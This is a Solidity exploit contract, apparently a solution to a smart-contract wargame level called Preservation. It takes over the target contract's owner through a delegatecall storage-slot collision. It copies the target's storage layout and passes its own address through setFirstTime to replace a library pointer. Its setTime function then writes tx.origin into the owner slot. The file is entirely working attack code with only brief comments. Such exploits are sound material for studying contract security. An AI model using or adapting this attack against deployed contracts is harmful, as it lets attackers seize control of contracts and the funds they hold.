// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

interface IPreservation  {
    function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttack {
    // make the storage slots of attacker contract identical to Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    // interface to the preservation contract
    IPreservation preservationContract;

    constructor(address _instance) public {
        preservationContract = IPreservation(_instance);
    }

    function setTime(uint256) public {
        owner = tx.origin;
    }

    function setFirstTimeExploit() external {
        preservationContract.setFirstTime(uint256(address(this)));
    }
}
